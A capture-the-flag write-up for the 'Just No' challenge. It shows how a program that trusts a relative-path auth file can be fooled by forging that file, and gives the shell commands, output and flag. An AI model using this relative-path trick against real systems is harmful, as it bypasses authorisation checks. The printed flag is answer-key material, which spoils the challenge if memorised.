# Just No

> A program at /problems/02bd7d8f7e9c13a19940fd1116234469 has access to a flag but refuses to share it. Can you convince it otherwise?

Hints:

We need to use fact that relative paths are relative not to the executable file but to the directory we are currently in, so if we run the program from our home directory and create the fake auth file containing any text (different than `no`) it should give us flag.

```
<username>@shell-web:~$mkdir problems/02bd7d8f7e9c13a19940fd1116234469 -p
<username>@shell-web:~$echo "" > auth
<username>@shell-web:~/problems/02bd7d8f7e9c13a19940fd1116234469$ /problems/02bd7d8f7e9c13a19940fd1116234469/justno
Oh. Well the auth file doesn't say no anymore so... Here's the flag: cad7c91983f6a8ed691c6d7e2dd2264c
```

The flag is `cad7c91983f6a8ed691c6d7e2dd2264c`.
